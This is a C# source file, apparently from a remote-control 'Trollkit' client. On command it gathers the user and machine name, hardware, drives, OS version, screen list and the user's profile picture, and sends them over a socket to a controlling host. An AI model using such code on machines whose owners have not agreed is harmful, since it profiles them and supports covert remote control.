using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client.Modules.CommandHandlers
{
	class SystemInfoHandler : ICommandHandler
	{
		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool GetPhysicallyInstalledSystemMemory(out ulong TotalMemoryInKilobytes);


		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "GetClientInfo":
					return CollectAndReturnSystemInfo(s);
			}

			return false;
		}

		/// <summary>
		/// Function that executes all functions and then returns their data to the Host
		/// </summary>
		/// <param name="s"></param>
		/// <returns></returns>
		private bool CollectAndReturnSystemInfo(Socket s)
		{
			bool success = true;
			try
			{
				string userName = $"> {Environment.UserName} on {Environment.MachineName}";
				TransferCommandObject userNameTransferObject = new TransferCommandObject { Command = "ComputerName", Value = userName };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(userNameTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("ComputerName error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string cpu = GetCPUName();
				TransferCommandObject cpuTranfserObject = new TransferCommandObject { Command = "CPU", Value = cpu };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(cpuTranfserObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("CPU error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string drives = GetSystemDrives();
				TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Value = drives };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("Drives error: " + e.Message, ConsoleColor.Red);
			}		

			try
			{
				string osVersion = GetOSVersion();
				TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("WindowsVersion error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string gpuName = GetGPUName();
				TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("GPU error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string ramString = GetRamAmount();
				TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "RAM", Value = ramString };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("RAM error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string screens = Screenshot.GetScreenList();
				TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "ScreenList", Value = screens };
				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("ScreenList error: " + e.Message, ConsoleColor.Red);
			}

			try
			{
				string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
			}
			catch (Exception e)
			{
				success = false;
				BConsole.WriteLine("ProfilePicture error: " + e.Message, ConsoleColor.Red);
			}

			return success;
		}
		
		/// <summary>
		/// Function that gets the amount of RAM in the system
		/// </summary>
		/// <returns></returns>
		private string GetRamAmount()
		{
			try
			{
				ulong l;
				GetPhysicallyInstalledSystemMemory(out l);
				return ((l / 1024) / 1024) + " GB RAM";
			}
			catch (Exception e)
			{
				BConsole.WriteLine("RAM Error: " + e.Message, ConsoleColor.Red);
				return "";
			}
		}

		/// <summary>
		/// Function that gets the GPU Name from the Registry
		/// </summary>
		/// <returns></returns>
		private string GetGPUName()
		{
			try
			{
				RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\VIDEO", false);
				if (key != null)
				{
					string notfound = "NotFound";
					string videoDriverLocation = key.GetValue(@"\Device\Video0", notfound).ToString();

					if (videoDriverLocation != notfound)
					{
						string[] splitInfo = videoDriverLocation.Replace(@"\", "|").Split('|');

						string path = $@"SYSTEM\CurrentControlSet\Control\Video\{splitInfo[splitInfo.Length - 2]}\{splitInfo[splitInfo.Length - 1]}";

						RegistryKey key2 = Registry.LocalMachine.OpenSubKey(path, false);
						if (key2 != null)
						{
							string driverDescription = key2.GetValue(@"DriverDesc", notfound).ToString();
							if (driverDescription != notfound)
							{
								return driverDescription;
							}
							else
								return "Unkown GPU";
						}
					}
				}
			}
			catch (Exception e)
			{
				BConsole.WriteLine("GPU Error: " + e.Message, ConsoleColor.Red);
			}
			return "Unknown GPU";
		}

		/// <summary>
		/// Function that gets the CPU Name from the Registry
		/// </summary>
		/// <returns></returns>
		private string GetCPUName()
		{
			try
			{
				RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
				if (key != null)
				{
					string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
					return processor;
				}
			}
			catch (Exception e)
			{
				BConsole.WriteLine("CPU Error: " + e.Message, ConsoleColor.Red);
			}

			return "Unknown Processor";
		}

		/// <summary>
		/// Function that gets the windows version from the Registry
		/// </summary>
		/// <returns></returns>
		private string GetOSVersion()
		{
			RegistryKey key;

			try
			{
				if (!Environment.Is64BitOperatingSystem)
				{
					key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
				}
				else
				{
					RegistryKey localKey = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, RegistryView.Registry64);
					key = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
				}

				if (key != null)
				{
					string releaseId = key.GetValue("ReleaseId", "").ToString();
					string productName = key.GetValue("ProductName", "Unknown OS").ToString();

					string bit = Environment.Is64BitOperatingSystem ? "x64" : "x86";

					return $"{productName} [{releaseId}] ({bit})";
				}
			}
			catch (Exception e)
			{
				BConsole.WriteLine("OS Error: " + e.Message, ConsoleColor.Red);
			}

			return "Unknown OS Version";
		}

		/// <summary>
		/// Function that gets and returns all the system drives
		/// </summary>
		/// <returns></returns>
		private string GetSystemDrives()
		{
			try
			{
				string returnString = "Available Drives: ";
				var drives = DriveInfo.GetDrives();
				foreach (DriveInfo info in drives)
				{
					if (info.IsReady)
					{
						returnString += $"({info.Name.Replace("\\", "")}) ";
					}
				}
				return returnString;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Drives error: " + e.Message, ConsoleColor.Red);
				return "";
			}
		}
	}
}
